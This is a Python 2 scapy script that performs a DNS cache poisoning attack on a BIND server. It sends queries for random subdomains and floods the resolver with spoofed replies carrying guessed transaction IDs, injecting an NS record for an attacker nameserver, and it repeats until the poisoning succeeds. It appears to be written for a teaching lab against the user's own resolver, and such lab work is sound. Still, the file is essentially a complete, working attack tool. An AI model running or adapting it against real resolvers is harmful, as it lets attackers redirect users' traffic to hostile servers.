#!/usr/bin/env python2
import argparse
import socket

from scapy.all import *
from random import randint, choice
from string import ascii_lowercase, digits
from subprocess import call


parser = argparse.ArgumentParser()
parser.add_argument("--ip", help="ip address for your bind - do not use localhost", type=str, required=True)
parser.add_argument("--port", help="port for your bind - listen-on port parameter in named.conf", type=int, required=True)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int, required=False)
parser.add_argument("--query_port", help="port from where your bind sends DNS queries - query-source port parameter in named.conf", type=int, required=True)
args = parser.parse_args()

# your bind's ip address
my_ip = args.ip
# your bind's port (DNS queries are send to this port)
my_port = args.port
# BIND's port
dns_port = args.dns_port
# port that your bind uses to send its DNS queries
my_query_port = args.query_port


'''
Generates random strings of length 10.
'''
def getRandomSubDomain():
	return ''.join(choice(ascii_lowercase + digits) for _ in range (10))

'''
Generates random 8-bit integer.
'''
def getRandomTXID():
	return randint(0, 256)

'''
Sends a UDP packet.
'''
def sendPacket(sock, packet, ip, port):
    sock.sendto(str(packet), (ip, port))

'''
Sends a DNS query using scapy.
'''
def SendDNSQuery():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    dnsPacket = DNS(rd=1, qd=DNSQR(qname='example.com'))

    while 1:
        spoof_random_domain = getRandomSubDomain() + ".example.com"

        # Query the BIND server for a non-existing name
        spoof_query = DNS(rd=1, qd=DNSQR(qname=spoof_random_domain))
        # sendPacket not working, so I send manually:
        sock.sendto(bytes(spoof_query), (my_ip, my_port))

        # # Flood it with a stream of spoofed DNS replies
        for i in range(100):
            # DNS fields:
            # https://scapy.readthedocs.io/en/latest/api/scapy.layers.dns.html
            spoof_response = DNS(   id=getRandomTXID(), 
                                    qr=1,
                                    aa=1, 
                                    qd=spoof_query.qd,
                                    nscount = 1,
                                    an=DNSRR(rrname=spoof_random_domain, ttl=99999, rdata='1.2.3.4', type='A'),
                                    ns=DNSRR(rrname='example.com', ttl=99999, rdata='ns.dbslabattacker.net', type='NS'))
            sock.sendto(bytes(spoof_response), (my_ip, my_query_port))
        
        # check if spoofed
        dnsPacket.qd.name = 'example.com'
        # sendPacket not working, so I send manually:
        sock.sendto(bytes(dnsPacket), (my_ip, my_port))
        response = sock.recv(4096)
        response = DNS(response)

        print "\n***** Packet Received from DNS BIND Server *****"
        print response.show()
        print "***** End of Remote DNS BIND Packet *****\n"

        if response[DNS].ns:
            if response[DNS].ns[DNSRR].rdata == 'ns.dbslabattacker.net.':
                print('Success!\n')
                break
            else:
                print('NS name:\n%s\n' % response[DNS].ns[DNSRR].rdata)
        
        print("---Next Round Attempt...---\n")
    

if __name__ == '__main__':
    print("----DNS Cache Poisoning start----\n")
    print("----INFO Section----")
    print("Bind ip: %s" % my_ip)
    print("DNS Proxy port number: %d" % my_port)
    if(dns_port):
        print("DNS Server port number: %d" % dns_port)
    print("DNS Query port number: %d" % my_query_port)
    print("--------------------\n")
    SendDNSQuery()
